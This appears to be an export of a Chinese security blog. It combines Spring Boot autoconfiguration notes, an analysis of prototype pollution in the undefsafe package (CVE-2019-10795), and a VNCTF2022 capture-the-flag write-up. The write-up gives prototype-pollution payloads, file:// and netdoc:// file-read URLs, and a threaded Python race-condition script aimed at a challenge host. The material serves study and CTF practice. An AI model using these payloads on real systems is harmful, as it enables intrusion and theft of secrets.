class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="配置绑定"><a href="#配置绑定" class="headerlink" title="配置绑定"></a>配置绑定</h1><h2 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h2><p>只有在容器中的组件，才会拥有SpringBoot提供的强大功能<br>@Component<br>@ConfigurationProperties(prefix &#x3D; “mycar”)</p>
<h2 id="EnableConfigurationProperties"><a href="#EnableConfigurationProperties" class="headerlink" title="@EnableConfigurationProperties"></a>@EnableConfigurationProperties</h2><p>@EnableConfigurationProperties(Car.class)<br>&#x2F;&#x2F;1、开启Car配置绑定功能<br>&#x2F;&#x2F;2、把这个Car这个组件自动注册到容器中</p>
<h1 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h1><h1 id="SpringBootApplication-1"><a href="#SpringBootApplication-1" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h1><p>Springboot的启动项：</p>
<p>这是一个合成注解，由</p>
<p>@SpringBootConfiguration<br>@EnableAutoConfiguration<br>@ComponentScan</p>
<p>合成而来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510083913-l8tah3s.png" alt="image.png"></p>
<h2 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h2><p>@Configuration表明他是一个config类</p>
<p>因此其实我们的主启动类MainAppliciation也是一个配置类</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510083932-3sui9xn.png" alt="image.png"></p>
<p>因此这样也是可以的</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510084220-2x8uzs8.png" alt="image.png"></p>
<h2 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAutoConfiguration &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;spring.boot.enableautoconfiguration&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] exclude() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    String[] excludeName() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别跟进</p>
<h3 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Import(&#123;Registrar.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> AutoConfigurationPackage &#123;</span><br><span class="line">    String[] basePackages() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] basePackageClasses() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里导入了<code>org.springframework.boot.autoconfigure.AutoConfigurationPackages.Registrar</code>类</p>
<p>在这个方法打上断点，在这里批量注册组件</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510085037-90mq1uf.png" alt="image.png"></p>
<p>metadata封装了注解的元信息，可以看到注解中的信息被封装在<code>com.xianbei.boot.MainApplication</code>中</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510090008-8rhogtr.png" alt="image.png"></p>
<p><code>(new AutoConfigurationPackages.PackageImports(metadata)).getPackageNames()</code>的结果就是我们的包名</p>
<p>这个包名也是对应了上面注解封装类的包</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510090041-hcsmcis.png" alt="image.png"></p>
<p>因此这里就是自动将<code>com.xianbei.boot</code>包下的组件注册到容器中去</p>
<h3 id="Import-AutoConfigurationImportSelector-class"><a href="#Import-AutoConfigurationImportSelector-class" class="headerlink" title="@Import({AutoConfigurationImportSelector.class})"></a>@Import({AutoConfigurationImportSelector.class})</h3><p><code>org.springframework.boot.autoconfigure.AutoConfigurationImportSelector#selectImports</code>方法返回一个数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] selectImports(AnnotationMetadata annotationMetadata) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.isEnabled(annotationMetadata)) &#123;</span><br><span class="line">        <span class="keyword">return</span> NO_IMPORTS;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        AutoConfigurationImportSelector.<span class="type">AutoConfigurationEntry</span> <span class="variable">autoConfigurationEntry</span> <span class="operator">=</span> <span class="built_in">this</span>.getAutoConfigurationEntry(annotationMetadata);</span><br><span class="line">        <span class="keyword">return</span> StringUtils.toStringArray(autoConfigurationEntry.getConfigurations());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，跟进getAutoConfigurationEntry方法，并打上断点调试</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510095712-w9caxs1.png" alt="image.png"></p>
<p>这里的配置项也是写好的，位于spring-boot-autoconfigure-2.6.6.jar\META-INF\spring.factories</p>
<p>但他实际上还是按需加载类的，这就是基于 springboot 的按条件装配@Conditional，根据规则最终实现按需装配。</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220510152132-ytvxw68.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>java开发</category>
      </categories>
      <tags>
        <tag>springboot2</tag>
      </tags>
  </entry>
  <entry>
    <title>Undefsafe模块原型链污染(CVE-2019-10795)</title>
    <url>/2022/03/14/undefsafeStudy/</url>
    <content><![CDATA[<h1 id="undefsafe模块简介"><a href="#undefsafe模块简介" class="headerlink" title="undefsafe模块简介"></a>undefsafe模块简介</h1><p><a href="https://www.npmjs.com/package/undefsafe">https://www.npmjs.com/package/undefsafe</a></p>
<p>在低版本( &lt; 2.0.3 )存在原型链污染漏洞</p>
<h2 id="npm安装存在漏洞的低版本"><a href="#npm安装存在漏洞的低版本" class="headerlink" title="npm安装存在漏洞的低版本"></a>npm安装存在漏洞的低版本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save undefsafe@2.0.0</span><br></pre></td></tr></table></figure>


<h2 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">b</span>.<span class="property">e</span>);<span class="comment">//test</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">c</span>.<span class="property">e</span>);<span class="comment">//Uncaught TypeError TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>当我们访问一个对象不存在的属性时，会报错然后退出程序，undefsafe帮我们解决了这个问题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">undefsafe</span>(object,<span class="string">&quot;a.c.e&quot;</span>));<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>


<h2 id="赋值操作"><a href="#赋值操作" class="headerlink" title="赋值操作"></a>赋值操作</h2><p>为一个不存在的属性赋值时，会在其上层赋值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">undefsafe</span>(object,<span class="string">&#x27;a.c.name&#x27;</span>,<span class="string">&#x27;xianbei&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object);</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314163648-1rj8xsa.png" alt="image.png"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当我们进行赋值操作，控制了第二个和第三个参数，便可以对对象的属性进行污染</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">undefsafe</span>(object,<span class="string">&#x27;__proto__.name&#x27;</span>,<span class="string">&#x27;xianbei&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">name</span>);<span class="comment">//xianbei</span></span><br></pre></td></tr></table></figure>


<p>但这还不够，通过这里的污染可以进一步攻击</p>
<h2 id="污染Object的toString方法"><a href="#污染Object的toString方法" class="headerlink" title="污染Object的toString方法"></a>污染Object的toString方法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> undefsafe = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; &quot;</span>+object);<span class="comment">// to String hacked</span></span><br><span class="line"><span class="title function_">undefsafe</span>(object,<span class="string">&#x27;__proto__.toString&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="string">&quot;to String hacked&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//undefsafe(object,&#x27;prototype.prototype.toString&#x27;,function()&#123;return &quot;to String hacked&quot;&#125;);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; &quot;</span>+object);<span class="comment">// to String hacked</span></span><br></pre></td></tr></table></figure>

<p>JavaScript中，其实对象中的方法也就是一个属性，所以这里undefsafe在object中没有<code>toStr</code>ing方法，他就会往<code>object.__proto__</code>，也就是Object中查找，然后污染了Object对象中本来的toString函数。</p>
<p>污染前：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314164627-m957ud6.png" alt="image.png"></p>
<p>污染后：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314164658-3ce758g.png" alt="image.png"></p>
<h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><p>接下来下断点调试，还是使用上面的demo调试</p>
<p>一开始初始化了一些变量</p>
<p>用filter遍历数组parts，这里判断为false，赋值给star</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170344-7zr9myg.png" alt="image.png"></p>
<p>判断type，45行得知type就是传入的对象类型，而这里两个判断都不满足</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170323-h605psv.png" alt="image.png"></p>
<p>对part进行遍历</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170642-333nynu.png" alt="image.png"></p>
<p>中间的判断，key不为*所以跳过</p>
<p>这里key为<code>__proto__</code>，obj为object对象，就获取到了<code>object.__proto__</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170753-xafvitw.png" alt="image.png"></p>
<p>第二次就是<code>object.__proto__.toString</code>，也就是Object对象的toString方法。</p>
<p>然后就是赋值操作，这里对Object对象的属性进行了赋值，污染了原型属性</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314171433-mpolewd.png" alt="image.png"></p>
<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314172153-zspg5tw.png" alt="image.png"></p>
<p>getOwnPropertyNames判断对象自己所有的属性</p>
<blockquote>
<p> <strong><code>Object.getOwnPropertyNames()</code></strong> 方法返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括Symbol值作为名称的属性）组成的数组。</p>
</blockquote>
<p>返回到上面一张图：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314170753-xafvitw.png" alt="image.png"></p>
<p>此时key为<code>__proto__</code>,obj为object对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(object).<span class="title function_">indexOf</span>(<span class="string">&#x27;__proto__&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i);<span class="comment">//-1</span></span><br></pre></td></tr></table></figure>

<p>更新之后会返回undefined</p>
<h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314173929-iha79ex.png" alt="image.png"></p>
<p>构造函数Note中的方法<code>edit_note</code>，存在原型链污染漏洞，通过控制第二个和第三个参数我们似乎可以进行原型链污染</p>
<p>找到edit_note路由，发现参数是可以控制的。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314174153-d64r37x.png" alt="image.png"></p>
<p>下面就要找利用点，这里通过for in，来遍历commands里的命令然后作为exec的参数执行并返回结果</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314174447-4wfs9cy.png" alt="image.png"></p>
<p>可以看到，我们通过遍历输出了恶意命令输入</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314175435-j6a5rgw.png" alt="image.png"></p>
<blockquote>
<p>for…in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf() 方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）。</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314180158-vw4972y.png" alt="image.png"></p>
<p>同样数组也适用</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314180227-rw6l528.png" alt="image.png"></p>
<blockquote>
<p>所以说得多调试，多调试，多调试</p>
</blockquote>
<p>至此问题迎刃而解，直接反弹shell就行</p>
]]></content>
      <categories>
        <category>nodejsSec</category>
      </categories>
      <tags>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>vnctf2022</title>
    <url>/2022/04/06/vnctf2022/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>陆陆续续把比赛都复现过去，随缘放到博客。</p>
<p>参考链接：</p>
<p><a href="http://www.yongsheng.site/2022/02/16/vnctf-2022/">http://www.yongsheng.site/2022/02/16/vnctf-2022/</a></p>
<p><a href="https://chowdera.com/2022/02/202202170129375291.html">https://chowdera.com/2022/02/202202170129375291.html</a></p>
<h1 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h1><p>data.js中有flag</p>
<p>VNCTF{Welcome_to_VNCTF2022}</p>
<h1 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>考点为cve-2022-21824，vm2虚拟机逃逸，污染原型链</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm2 = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> vm2.<span class="title class_">NodeVM</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/eval&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> e = req.<span class="property">body</span>.<span class="property">e</span>;</span><br><span class="line">  <span class="keyword">if</span> (!e) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(vm.<span class="title function_">run</span>(<span class="string">&quot;module.exports=&quot;</span>+e)?.<span class="title function_">toString</span>() ?? <span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;wrong?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">k</span> =&gt;</span> <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[k]);</span><br><span class="line">    res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">FLAG</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> p = req.<span class="property">query</span>.<span class="property">path</span> || <span class="string">&quot;/src/index.js&quot;</span>;</span><br><span class="line">  p = path.<span class="title function_">join</span>(path.<span class="title function_">resolve</span>(<span class="string">&quot;.&quot;</span>), path.<span class="title function_">resolve</span>(p));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">  res.<span class="title function_">sendFile</span>(p);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">8888</span>);</span><br></pre></td></tr></table></figure>

<p>这道题用了vm2模块，但是都是最新包，暂不存在能够逃逸的1day。</p>
<blockquote>
<p>镜像为node:lts-alpine，package.json全部为最新包</p>
</blockquote>
<p>拿到flag的条件是<code>Object.keys(Object.prototype).length &gt; 0</code>，即Object原型的属性需要大于1</p>
<blockquote>
<p><code>Object.keys</code> 返回一个所有元素为字符串的数组，其元素来自于从给定的<code>object</code>上面可直接枚举的属性。这些属性的顺序与手动遍历该对象属性时的一致。</p>
</blockquote>
<p>原题：<a href="https://brycec.me/posts/dicectf_2022_writeups#vm-calc">https://brycec.me/posts/dicectf_2022_writeups#vm-calc</a></p>
<p>题中可以得知是node新修复的漏洞，<a href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824</a></p>
<p>而题目环境中node为<code>FROM node:16.13.1-bullseye-slim</code>，这个通过题目发布时的镜像版本可以得知存在此原型链污染漏洞</p>
<p>复现时hackerone已经发布了漏洞相关报告</p>
<p><a href="https://hackerone.com/reports/1431042">https://hackerone.com/reports/1431042</a></p>
<p>换低版本的node，复现成功。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316204046-1lf32ch.png" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">console.table([&#123;x:<span class="number">1</span>&#125;],[<span class="string">&#x27;__proto__&#x27;</span>])</span><br></pre></td></tr></table></figure>


<h1 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>考点为条件竞争，线程漏洞</p>
<p>可以用file协议或者netdoc协议读取文件目录和下载文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">file:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>tomcat<span class="operator">/</span>webapps<span class="operator">/</span>ROOT<span class="operator">/</span>WEB<span class="operator">-</span>INF<span class="operator">/</span>lib</span><br><span class="line">netdoc:<span class="operator">/</span><span class="operator">/</span><span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>tomcat<span class="operator">/</span>webapps<span class="operator">/</span>ROOT<span class="operator">/</span>WEB<span class="operator">-</span>INF<span class="operator">/</span>lib</span><br></pre></td></tr></table></figure>

<p>组件包</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">commons<span class="operator">-</span>lang3<span class="number">-3.7</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>annotations<span class="operator">-</span>api<span class="number">-8.5</span><span class="number">.75</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>annotations<span class="operator">-</span>api<span class="number">-9.0</span><span class="number">.38</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>embed<span class="operator">-</span>core<span class="number">-8.5</span><span class="number">.75</span>.jar</span><br><span class="line">tomcat<span class="operator">-</span>embed<span class="operator">-</span>core<span class="number">-9.0</span><span class="number">.38</span>.jar</span><br></pre></td></tr></table></figure>

<p>然后可以把class文件都下下来反编译</p>
<p>Secr3t类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316212409-0qtg9rl.png" alt="image.png"></p>
<p>看Servlet</p>
<p>处理get请求，传入一个name参数，但是这里判断上下一样，矛盾了，这里没有<strong>处理多线程，存在条件竞争漏洞</strong></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316221036-8nn5b5f.png" alt="image.png"></p>
<p>多线程请求绕过，让Servlet内部出错拿到key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">host = <span class="string">&quot;http://d279b171-e8d9-4364-9c3f-0623e93535a1.node4.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myThread</span> (threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        runing(self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runing</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     r = requests.get(host+<span class="string">&quot;/evi1?name=%s&quot;</span> % name)</span><br><span class="line">     r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">     <span class="keyword">if</span> r.text.find(<span class="string">&quot;The Key is&quot;</span>)!=-<span class="number">1</span>:</span><br><span class="line">         <span class="built_in">print</span>(r.text)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">thread1 = myThread(<span class="string">&quot;aaaaaaa&quot;</span>)</span><br><span class="line">thread2 = myThread(<span class="string">&quot;vnctf2022&quot;</span>)</span><br><span class="line"></span><br><span class="line">thread1.start()</span><br><span class="line">thread2.start()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DkF6nMYB5CeQioYpRNLFPt0wTLOWaFF5</span><br></pre></td></tr></table></figure>


<p>看处理Post请求</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235554-r808ne8.png" alt="image.png"></p>
<p>先用<code>SerAndDe.deserialize</code>反序列化对象，然后再用<code>User.equals()</code>来比较</p>
<p>看下User类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235838-vq9ebsc.png" alt="image.png"></p>
<blockquote>
<p>将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220316235910-zk7f80c.png" alt="image.png"></p>
<p>重写writeObject方法强制写入height域</p>
